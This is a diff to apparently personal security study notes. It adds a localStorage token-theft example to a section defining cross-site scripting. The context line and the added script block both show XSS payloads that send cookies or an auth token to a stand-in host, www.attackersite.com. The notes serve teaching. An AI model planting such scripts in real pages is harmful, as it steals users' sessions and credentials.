@@ -149,9 +149,24 @@ Example Form:
 ## XSS Attack
 1. **XSS Definition**: Cross-Site Scripting (XSS) is a security vulnerability where an attacker injects malicious scripts into web pages viewed by other users.
 2. **Attack Example**: An attacker posts a malicious script on `www.legitbank.com` through a comment section: `<script>fetch('https://www.attackersite.com/steal-cookie?cookie=' + document.cookie);</script>`.
-3. **Script Execution**: When other users view the page, the script executes in their browser, potentially stealing their session cookies or performing other malicious actions.
-4. **localStorage Exploitation**: If `www.legitbank.com` stores sensitive tokens in `localStorage`, a similar script can send these tokens to `www.attackersite.com`.
-5. **Types of XSS**:
+3. **Attack Example on localStorage**:
+   - This could be through a comment section, forum post, or any part of the site that incorrectly handles user input
+   - Attacker injects a script into `www.legitbank.com`: 
+     ```html
+     <script>
+       var userToken = localStorage.getItem('authToken');
+       fetch('https://www.attackersite.com/steal-token', {
+         method: 'POST',
+         body: JSON.stringify({ token: userToken }),
+         headers: { 'Content-Type': 'application/json' }
+       });
+     </script>
+     ```
+   - This script steals the user's authentication token from localStorage and sends it to the attacker's site.
+ 
+5. **Script Execution**: When other users view the page, the script executes in their browser, potentially stealing their session cookies or performing other malicious actions.
+6. **localStorage Exploitation**: If `www.legitbank.com` stores sensitive tokens in `localStorage`, a similar script can send these tokens to `www.attackersite.com`.
+7. **Types of XSS**:
     - *Stored XSS*: The malicious script is stored on the target server (e.g., in a database) and is executed every time the compromised page is loaded.
     - *Reflected XSS*: The malicious script is part of the request sent to the server and is reflected back in the server's response.
 
